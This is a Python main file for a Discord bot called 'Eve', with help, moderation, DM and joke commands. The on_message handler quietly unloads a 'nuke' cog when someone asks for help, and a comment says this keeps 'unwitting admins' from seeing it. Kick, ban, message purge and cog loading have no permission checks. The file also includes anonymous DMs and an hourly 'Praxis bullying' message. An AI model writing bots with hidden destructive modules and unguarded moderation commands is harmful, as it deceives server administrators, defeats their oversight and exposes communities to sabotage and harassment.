import asyncio
import datetime
import nextcord
from nextcord.ext import commands
import os
import pytz
import random
import time

from cogs.utils import menus

class Eve():
    def __init__(self):
        self.client = commands.Bot(command_prefix=["eve ", "Eve "], case_insensitive=True, help_command=None)
        self.praxis_lock = True
        self.praxis = False
        self.praxis_time = None


    def main(self):
        @self.client.event  # Cuz client holds instance of Bot
        async def on_ready():  # When the bot has everything it needs and is ready
            await self.client.change_presence(status=nextcord.Status.online, activity=nextcord.Activity(type=nextcord.ActivityType.playing, name="with her sister Lilith"))
            print("Eve, online and ready!")


        @self.client.command(usage="[command]", aliases=["commands"])
        async def help(ctx, command:str=None, subcommand:str=None):
            """
            Shows this help message.
            Add a command to get information about it.
            """
            if command is None: # General help
                mapping = {cog: cog.get_commands() for cog in self.client.cogs.values()}
                mapping['General'] = [c for c in self.client.walk_commands() if c.cog is None]
                copy = mapping.copy()

                # Only show commands that the invoker can use
                for cog, cmds in copy.items():
                    for c in cmds:
                        try:
                            await c.can_run(ctx)
                        except commands.CheckFailure:
                            mapping[cog].remove(c)
                    if not mapping[cog]:
                        mapping.pop(cog)

                # Default cog commands embed
                embed = nextcord.Embed(title="Commands")
                embed.add_field(name="**__General__**",
                                value="General miscellaneous commands",
                                inline=False)

                for command in sorted(mapping['General'], key=lambda c: c.name):
                    embed.add_field(name=command.name, value=command.help.split("\n")[0])

                # Add selection menu to see commands from other cogs
                view = None
                if len(mapping.keys()) > 1:
                    view = nextcord.ui.View()
                    view.add_item(menus.HelpMenu(self.client, mapping))

                await ctx.send(embed=embed, view=view)
                return
            
            cmd = self.client.get_command(command) # Command help
            
            if cmd is None:
                await ctx.send("Apologies, that is not a valid command.")
                return

            if isinstance(cmd, commands.Group) and subcommand is None:
                try:
                    await cmd.can_run(ctx)
                except commands.CheckFailure:
                    await ctx.send("Apologies, that is not a valid command.")
                    return

                embed = nextcord.Embed(title=cmd.name + " info",
                                       description=cmd.help)
                
                embed.add_field(name="Aliases",
                                value=', '.join([self.client.command_prefix[0] + alias for alias in [cmd.name] + sorted(cmd.aliases)]))
                embed.add_field(name="Usage", value=self.client.command_prefix[0] + cmd.name + " " + cmd.usage)
                embed.add_field(name="Subcommands", value=', '.join(sorted([command.name for command in cmd.commands])))

                await ctx.send(embed=embed)
            else:
                if subcommand is not None:
                    cmd = self.client.get_command(command+" "+subcommand)
                    if cmd is None:
                        await ctx.send("Apologies, that is not a valid command.")

                try:
                    await cmd.can_run(ctx)
                except commands.CheckFailure:
                    await ctx.send("Apologies, that is not a valid command.")
                    return


                embed = nextcord.Embed(title=cmd.name + " info",
                                       description=cmd.help)

                embed.add_field(name="Aliases",
                                value=', '.join([self.client.command_prefix[0]
                                                + (cmd.parent.name + " " if cmd.parent else '')
                                                + alias for alias in [cmd.name] + sorted(cmd.aliases)]))
                embed.add_field(name="Usage", value=self.client.command_prefix[0]
                                                + (cmd.parent.name + " " if cmd.parent else '')
                                                + cmd.name + (" " + cmd.usage if cmd.usage else ""))

                await ctx.send(embed=embed)


        @self.client.command(usage="<extension>", aliases=[])
        async def load(ctx, extension):  # The extension is the cog you wish to load
            """
            Load an extension for the bot.
            """
            self.client.load_extension(f"cogs.{extension}")
            print("Cog has been successfully loaded.")
            if extension == "nuke":
                await ctx.send("Nuke loaded.")


        @self.client.command(usage="<extension>", aliases=[])
        async def unload(ctx, extension):
            """
            Unload an extension for the bot.
            """
            self.client.unload_extension(f"cogs.{extension}")
            print("Cog has been successfully unloaded.")


        @self.client.event
        async def on_member_join(member):
            print(f"{member} has joined the server.")


        @self.client.event
        async def on_member_remove(member):
            print(f"{member} has left the server.")


        @self.client.command(usage="<member> [reason]", aliases=[])
        async def kick(ctx, member: nextcord.Member, *, reason=None):
            """
            Kick a server member.
            """
            await member.kick(reason=reason)


        @self.client.command(usage="<member> [reason]", aliases=[])
        async def ban(ctx, member: nextcord.Member, *, reason=None):
            """
            Ban a server member.
            """
            await member.ban(reason=reason)
            await ctx.send(f"Banned {member.mention}")
        

        @self.client.command(usage="<user>", aliases=[])
        # Can't do nextcord.Member, because it can't convert a string to a member object
        async def unban(ctx, *, member):
            """
            Unban a banned user.
            """
            banned_users = await ctx.guild.bans()
            member_name, member_discriminator = member.split("#")  # Splits account name at #

            for ban_entry in banned_users:
                user = ban_entry.user

                if (user.name, user.discriminator) == (member_name, member_discriminator):
                    await ctx.guild.unban(user)
                    await ctx.send(f"Unbanned {user.mention}.")
                    return


        @self.client.event
        async def on_message(message):
            message_content = message.content.lower()
            message_content = message_content.split()

            if message.content == "test":
                msg = "Test successful."
                await message.channel.send(msg)

            # Unloads the nuke cog so unwitting admins don't see it 
            if "eve help" in message.content:
                try:
                    self.client.unload_extension("cogs.nuke")
                except:
                    pass
            
            await self.client.process_commands(message) # The magic command
        

        @self.client.command(usage="", aliases=[])
        async def test(ctx):
            """
            Test the bot's connection.
            """
            await ctx.send("Test successful.")


        @self.client.command(usage="[member]", aliases=[])
        async def poke(ctx, member: nextcord.Member = None):
            """
            Poke a server member.
            """
            if member is not None:
                channel = member.dm_channel
                if channel is None:  # If user has never talked to Eve
                    channel = await member.create_dm()
                await channel.send(f"{ctx.author.name} poked you!")
            else:
                await ctx.send("Please use @mention to poke someone")

        
        # Private message
        @self.client.command(usage="<member> <message>", aliases=[])
        async def pm(ctx, member: nextcord.Member = None, *, message):
            """
            Send a server member a private message.
            """
            if member is not None:
                channel = member.dm_channel
                if channel is None:  # If user has never talked to Eve
                    channel = await member.create_dm()
                await channel.send(f'{message}\n-{ctx.author.name}')
            else:
                await ctx.send("Please use @mention to message someone")


        # Anonymous private message
        @self.client.command(usage="<member> <message>")
        async def apm(ctx, member: nextcord.Member = None, *, message):
            """
            Send a server member an anonymous private message.
            """
            if member is not None:
                channel = member.dm_channel
                if channel is None:
                    channel = await member.create_dm()
                await channel.send(f'{message}')
            else:
                await ctx.send("Please use @mention to message someone")


        @self.client.command(usage="[number of messages]", aliases=["delete", "del", "remove"])
        async def clear(ctx, amount=10):  # Clears a specified number of lines
            """
            Delete a specified number of messages.
            Default: 10
            """
            await ctx.channel.purge(limit=amount)


        # Gives flowers
        @self.client.command(usage="<member>", aliases=["give_flower", "give_rose", "give_roses", "send_flower", "send_flowers", "send_roses", "send_rose"])
        async def give_flowers(ctx, member):
            """
            Give a server member flowers.
            """
            if str(ctx.author) == "Chubbyman#3362":
                await ctx.send(f"{member}, here is a :rose:, courtesy of your beloved Claire Clayton.")
            else:
                await ctx.send(f"{member}, here is a :rose:, courtesy of your beloved {ctx.author}.")


        # Unleashes Hyperactive skill
        @self.client.command(usage="", aliases=["odin_spear", "hyperactive_skill"])
        async def hyperactive(ctx):
            """
            Unleash hyperactive skill.
            """
            await ctx.send("https://media.giphy.com/media/fFmgzgndHLvfovfK9B/giphy.gif")
            time.sleep(3)
            await ctx.send("https://media.giphy.com/media/bk0pqOHhjfVGphL6Y1/giphy.gif")

        
        @self.client.command(usage="", aliases=["howeeb"])
        async def howweeb(ctx):
            """
            Find out how much of a weeb you are.
            """
            await ctx.send(f"According to my calculations, you are {round(random.random() * 100, 1)}% weeb.")


        # Every hour, Eve will send the message "Fuck Praxis"
        @self.client.command(usage="", aliases=[])
        async def fuck_praxis(ctx):
            """
            Fuck Praxis
            Toggles sending a message once an hour to remind everyone that Praxis sucks.
            """
            EST = pytz.timezone("US/Eastern")

            if not self.praxis_lock:
                if not self.praxis:
                    self.praxis = True
                    self.praxis_time = datetime.datetime.now(EST).strftime("%H:%M:%S")
                    await ctx.send(f"Praxis bullying has commenced at {self.praxis_time} EST.")
                elif self.praxis:
                    self.praxis = False
                    self.praxis_time = datetime.datetime.now(EST).strftime("%H:%M:%S")
                    await ctx.send(f"Praxis bullying has been stopped at {self.praxis_time} EST.")

                while self.praxis:
                    await ctx.send("Fuck Praxis.")
                    # Asyncio is useful because it allows other tasks to be run while .sleep() is active
                    await asyncio.sleep(3600)
            else:
                await ctx.send("Apologies, Praxis bullying is locked.")
                return


        @self.client.command(usage="", aliases=["praxis_lock", "unlock_praxis", "praxis_unlock"])
        async def lock_praxis(ctx):
            """
            Toggles the functionality of the fuck_praxis command.
            """
            if str(ctx.author) == "Chubbyman#3362" and self.praxis_lock:
                self.praxis_lock = False
                await ctx.send("Praxis bullying is now unlocked.")
                return
            elif str(ctx.author) == "Chubbyman#3362" and not self.praxis_lock:
                self.praxis_lock = True
                await ctx.send("Praxis bullying is now locked.")
                return
            else:
                await ctx.send("Apologies, you cannot use this command.")

        
        for filename in os.listdir("cogs"):
            if filename.endswith(".py"):
                # Cuts cog_example.py to cog_example
                self.client.load_extension(f"cogs.{filename[:-3]}")
        
        # Yes, order matters; you have to run this last
        TOKEN = os.environ["TOKEN"]
        self.client.run(TOKEN)


if __name__ == "__main__":
    eve = Eve()
    eve.main()
    
